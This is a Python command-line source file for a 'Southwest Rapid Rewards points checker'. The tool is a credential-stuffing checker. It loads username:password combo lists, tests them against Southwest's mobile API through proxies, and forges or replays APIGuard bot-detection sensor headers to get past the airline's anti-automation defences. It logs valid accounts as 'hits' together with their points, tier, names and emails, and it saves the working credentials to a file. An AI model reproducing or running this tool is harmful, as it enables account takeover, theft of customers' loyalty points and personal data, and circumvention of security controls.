"""Southwest Rapid Rewards points checker CLI."""

from __future__ import annotations

import argparse
import json
import sys
import time
from pathlib import Path

from southwest_checker.checker import SouthwestChecker, load_combos
from southwest_checker.chlz_parser import load_sensor_config, parse_capture, save_sensor_config
from southwest_checker.proxy import resolve_proxy
from southwest_checker.apiguard.headers import decode_e, decode_g


def cmd_extract(args: argparse.Namespace) -> int:
    print(f"Extracting sensor headers from {args.chlz}...")
    data = parse_capture(args.chlz)
    output = args.output or "sensor_config.json"
    save_sensor_config(data, output)
    print(f"Saved sensor config to {output}")
    print(f"  Sensor headers: {len(data['sensor_headers'])}")
    print(f"  Base headers: {len(data['base_headers'])}")
    if data.get("sample_response"):
        info = data["sample_response"]
        points = info.get("customers.userInformation.redeemablePoints", "?")
        user = info.get("customers.userInformation.credential", "?")
        print(f"  Sample account from capture: {user} ({points} points)")
    return 0


def cmd_decode(args: argparse.Namespace) -> int:
    if args.header_type == "e":
        decoded = decode_e(args.token)
        sensor = json.loads(decoded["sensor"].decode("latin1"))
        print(json.dumps(sensor, indent=2))
    elif args.header_type == "g":
        decoded = decode_g(args.token)
        signal = json.loads(decoded["signal"].decode("utf-8"))
        print(json.dumps(signal, indent=2))
    return 0


def cmd_check(args: argparse.Namespace) -> int:
    config = load_sensor_config(args.config)
    proxy = resolve_proxy(args.proxy, config.get("proxy"))
    if proxy:
        print(f"Using proxy: {proxy.split('@')[-1]}")
    if args.auto_sensors:
        print("APIGuard: generating fresh -e/-g headers per request")
    checker = SouthwestChecker.from_config(
        config, proxy=proxy, auto_sensors=args.auto_sensors
    )

    if args.username and args.password:
        combos = [(args.username, args.password)]
    elif args.combo_file:
        combos = load_combos(args.combo_file)
        print(f"Loaded {len(combos)} combos from {args.combo_file}")
    else:
        print("Provide --username/--password or --combo-file", file=sys.stderr)
        return 1

    hits = bads = retries = errors = 0
    results: list[dict] = []

    for i, (username, password) in enumerate(combos, 1):
        result = checker.check(username, password)
        print(result.summary())

        if result.status == "hit":
            hits += 1
        elif result.status == "bad":
            bads += 1
        elif result.status == "retry":
            retries += 1
        else:
            errors += 1

        if args.json_output:
            results.append(
                {
                    "username": result.username,
                    "status": result.status,
                    "redeemable_points": result.redeemable_points,
                    "tier": result.tier,
                    "account_number": result.account_number,
                    "first_name": result.first_name,
                    "last_name": result.last_name,
                    "email": result.email,
                    "error": result.error,
                }
            )

        if args.hits_file and result.status == "hit":
            with open(args.hits_file, "a", encoding="utf-8") as f:
                f.write(f"{username}:{password} | {result.redeemable_points} pts | {result.tier}\n")

        if i < len(combos) and args.delay > 0:
            time.sleep(args.delay)

    print(f"\n--- Summary: {hits} hits, {bads} bad, {retries} retry, {errors} errors ---")

    if args.json_output:
        with open(args.json_output, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
        print(f"Results saved to {args.json_output}")

    return 0


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Southwest Rapid Rewards points checker (mobile.southwest.com API)"
    )
    sub = parser.add_subparsers(dest="command", required=True)

    extract_p = sub.add_parser("extract", help="Extract sensor headers from a Charles .chlz capture")
    extract_p.add_argument("chlz", help="Path to .chlz capture file")
    extract_p.add_argument("-o", "--output", help="Output sensor config JSON path")

    check_p = sub.add_parser("check", help="Check account(s) for Rapid Rewards points")
    check_p.add_argument("-c", "--config", default="sensor_config.json", help="Sensor config JSON")
    check_p.add_argument("-u", "--username", help="Single username to check")
    check_p.add_argument("-p", "--password", help="Single password to check")
    check_p.add_argument("-f", "--combo-file", help="File with username:password combos")
    check_p.add_argument(
        "--proxy",
        help="Proxy as URL or host:port:user:pass (falls back to SW_PROXY env / config)",
    )
    check_p.add_argument("--delay", type=float, default=2.0, help="Delay between checks (seconds)")
    check_p.add_argument("--hits-file", help="Append hits to this file")
    check_p.add_argument("--json-output", help="Save all results as JSON")
    check_p.add_argument(
        "--auto-sensors",
        action="store_true",
        help="Generate fresh -e/-g APIGuard headers per request (requires capture template)",
    )

    decode_p = sub.add_parser("decode", help="Decode an APIGuard header token")
    decode_p.add_argument("header_type", choices=["e", "g"], help="Header type to decode")
    decode_p.add_argument("token", help="Header value to decode")

    args = parser.parse_args()

    if args.command == "extract":
        return cmd_extract(args)
    if args.command == "check":
        return cmd_check(args)
    if args.command == "decode":
        return cmd_decode(args)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
